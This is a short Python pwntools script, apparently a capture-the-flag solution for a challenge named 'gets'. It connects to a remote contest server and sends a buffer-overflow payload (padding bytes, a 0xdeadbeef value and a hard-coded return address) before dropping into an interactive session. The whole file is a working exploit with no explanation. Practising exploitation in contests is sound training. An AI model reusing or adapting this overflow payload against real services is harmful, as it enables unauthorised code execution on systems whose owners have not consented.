from pwn import *

exe = ELF("gets")

context.binary = exe


def conn():
        if False:
                return process([exe.path])
        else:
                return remote("gets.litctf.live", 1337)


def main():
        r = conn()
        r.recvuntil("Are you starting to understand?")
        r.sendline(b'Yes' + b'\0' + b'A'*36 + p64(0xdeadbeef) + p64(0x7ffff7fb1390))
        r.interactive()


if __name__ == "__main__":
        main()
